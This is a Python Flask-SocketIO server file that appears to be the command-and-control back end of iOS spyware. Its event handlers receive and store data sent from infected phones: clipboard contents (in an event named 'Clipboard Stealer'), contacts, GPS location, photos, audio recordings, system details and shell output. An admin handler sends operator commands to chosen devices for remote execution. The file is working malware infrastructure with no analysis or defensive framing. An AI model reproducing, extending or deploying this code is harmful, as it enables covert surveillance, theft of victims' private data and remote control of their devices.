"""
WebSocket Routes
Socket.IO event handlers
"""

import json
import os
import base64
from datetime import datetime
from flask import request
from flask_socketio import emit, disconnect
from app.auth import (
    verify_token,
    require_socket_auth,
    add_authenticated_session,
    remove_authenticated_session
)
from app.middleware import validate_identify_data, sanitize_string
from app.utils import logger, log_connection, log_command


def init_socket_handlers(socketio, app, db, Device, Log, connected_devices):
    """Initialize all socket event handlers"""
    
    @socketio.on('connect')
    def handle_connect():
        """New WebSocket connection"""
        session_id = request.sid
        client_ip = request.remote_addr
        
        log_connection('CONNECT', session_id, client_ip)
        
        connected_devices[session_id] = {
            'session_id': session_id,
            'ip': client_ip,
            'connected_at': datetime.now().isoformat(),
            'authenticated': False,
            'identified': False,
            'device_id': None
        }
        
        emit('server_message', {
            'message': 'Connected. Please authenticate.',
            'session_id': session_id
        })
    
    
    @socketio.on('disconnect')
    def handle_disconnect():
        """WebSocket disconnection"""
        session_id = request.sid
        
        device_info = connected_devices.pop(session_id, {})
        device_id = device_info.get('device_id', 'Unknown')
        
        remove_authenticated_session(session_id)
        log_connection('DISCONNECT', session_id, request.remote_addr, device_id)
        
        socketio.emit('device_disconnected', {'session_id': session_id})
    
    
    @socketio.on('authenticate')
    def handle_authenticate(data):
        """JWT authentication over WebSocket"""
        session_id = request.sid
        token = data.get('token')
        
        if not token:
            emit('auth_error', {'error': 'Token required'})
            logger.warning(f"[AUTH] No token from {session_id}")
            return
        
        payload = verify_token(token)
        
        if not payload:
            emit('auth_error', {'error': 'Invalid or expired token'})
            logger.warning(f"[AUTH] Invalid token from {session_id}")
            disconnect()
            return
        
        device_id = payload.get('device_id')
        
        add_authenticated_session(session_id)
        
        if session_id in connected_devices:
            connected_devices[session_id]['authenticated'] = True
            connected_devices[session_id]['device_id'] = device_id
        
        logger.info(f"[AUTH] Success: {device_id} (session: {session_id})")
        
        emit('auth_success', {
            'message': 'Authentication successful',
            'device_id': device_id
        })
    
    
    @socketio.on('identify')
    @require_socket_auth
    def handle_identify(data):
        """Device identification"""
        session_id = request.sid
        
        # Sanitize input
        data = validate_identify_data(data)
        device_id = data.get('device_id', 'unknown')
        
        logger.info(f"[IDENTIFY] {device_id} | {data.get('device_name')} | iOS {data.get('system_version')}")
        
        with app.app_context():
            device = db.session.query(Device).filter_by(device_name=device_id).first()
            
            if not device:
                device = Device(
                    device_name=device_id,
                    ip_address=request.remote_addr,
                    first_seen=datetime.now()
                )
                db.session.add(device)
                logger.info(f"[IDENTIFY] New device registered: {device_id}")
            
            device.update_info(data)
            device.ip_address = request.remote_addr
            db.session.commit()
        
        connected_devices[session_id] = {
            'session_id': session_id,
            'device_id': device_id,
            'ip': request.remote_addr,
            'connected_at': datetime.now().isoformat(),
            'authenticated': True,
            'identified': True,
            'info': data
        }
        
        emit('server_message', {'message': f'Device {device_id} registered'})
        socketio.emit('device_connected', connected_devices[session_id])
    
    
    # Plugin event handlers
    
    @socketio.on('Clipboard Stealer')
    @require_socket_auth
    def handle_clipboard(data):
        device_id = data.get('device_id', 'unknown')
        clipboard = sanitize_string(data.get('clipboard', ''), 10000)
        
        logger.info(f"[DATA] Clipboard from {device_id}: {len(clipboard)} chars")
        save_log(db, Device, Log, device_id, 'Clipboard Stealer', clipboard)
        emit('server_message', {'message': 'Clipboard received'})
    
    
    @socketio.on('System Info')
    @require_socket_auth
    def handle_system_info(data):
        device_id = data.get('device_id', 'unknown')
        
        logger.info(f"[DATA] System info from {device_id}")
        save_log(db, Device, Log, device_id, 'System Info', json.dumps(data))
        emit('server_message', {'message': 'System info received'})
    
    
    @socketio.on('Location Data')
    @require_socket_auth
    def handle_location(data):
        device_id = data.get('device_id', 'unknown')
        lat = data.get('latitude', 0)
        lon = data.get('longitude', 0)
        
        logger.info(f"[DATA] Location from {device_id}: {lat}, {lon}")
        save_log(db, Device, Log, device_id, 'Location Data', json.dumps({'lat': lat, 'lon': lon}))
        emit('server_message', {'message': 'Location received'})
    
    
    @socketio.on('Contacts Data')
    @require_socket_auth
    def handle_contacts(data):
        device_id = data.get('device_id', 'unknown')
        contacts = data.get('contacts', [])
        
        logger.info(f"[DATA] Contacts from {device_id}: {len(contacts)} entries")
        save_log(db, Device, Log, device_id, 'Contacts Data', json.dumps(contacts))
        emit('server_message', {'message': f'{len(contacts)} contacts received'})
    
    
    @socketio.on('Photo Data')
    @require_socket_auth
    def handle_photo(data):
        device_id = data.get('device_id', 'unknown')
        photo_base64 = data.get('photo', '')
        
        logger.info(f"[DATA] Photo from {device_id}: {len(photo_base64)} bytes")
        
        filename = ""
        if photo_base64:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"data/photos/{device_id}_{timestamp}.jpg"
            try:
                os.makedirs('data/photos', exist_ok=True)
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(photo_base64))
                logger.info(f"[DATA] Photo saved: {filename}")
            except Exception as e:
                logger.error(f"[DATA] Photo save error: {e}")
        
        save_log(db, Device, Log, device_id, 'Photo Data', f"Photo: {filename}" if filename else "Empty")
        emit('server_message', {'message': 'Photo received'})
    
    
    @socketio.on('Audio Data')
    @require_socket_auth
    def handle_audio(data):
        device_id = data.get('device_id', 'unknown')
        audio_base64 = data.get('audio', '')
        
        logger.info(f"[DATA] Audio from {device_id}: {len(audio_base64)} bytes")
        
        if audio_base64:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"data/audio/{device_id}_{timestamp}.m4a"
            try:
                os.makedirs('data/audio', exist_ok=True)
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(audio_base64))
            except Exception as e:
                logger.error(f"[DATA] Audio save error: {e}")
        
        save_log(db, Device, Log, device_id, 'Audio Data', f"Audio: {len(audio_base64)} bytes")
        emit('server_message', {'message': 'Audio received'})
    
    
    @socketio.on('Shell Output')
    @require_socket_auth
    def handle_shell_output(data):
        device_id = data.get('device_id', 'unknown')
        output = data.get('output', '')
        command = data.get('command', '')
        
        logger.info(f"[DATA] Shell from {device_id}: {command}")
        save_log(db, Device, Log, device_id, 'Shell Output', json.dumps({
            'command': command,
            'output': output
        }))
        emit('server_message', {'message': 'Shell output received'})
    
    
    @socketio.on('administrate')
    def handle_admin(data):
        """Admin command from panel"""
        command = data.get('command')
        target_device = data.get('device_id')
        params = data.get('params', {})
        
        log_command(command, target_device, 'admin_panel')
        
        if target_device and command:
            send_command(socketio, connected_devices, target_device, command, params)


def save_log(db, Device, Log, device_id: str, plugin_name: str, data: str):
    """Save log to database"""
    try:
        device = db.session.query(Device).filter_by(device_name=device_id).first()
        
        if device:
            log = Log(
                device_id=device.id,
                plugin_name=plugin_name,
                data=data,
                data_size=len(data) if data else 0,
                timestamp=datetime.now()
            )
            db.session.add(log)
            db.session.commit()
    except Exception as e:
        logger.error(f"[DB] Log save error: {e}")


def send_command(socketio, connected_devices, device_id: str, command: str, params: dict = None):
    """Send command to a specific device"""
    for session_id, info in connected_devices.items():
        if info.get('device_id') == device_id and info.get('authenticated'):
            payload = {'command': command, 'params': params or {}}
            socketio.emit('execute_command', payload, room=session_id)
            logger.info(f"[CMD] Sent: {command} -> {device_id}")
            return True
    
    logger.warning(f"[CMD] Device offline: {device_id}")
    return False
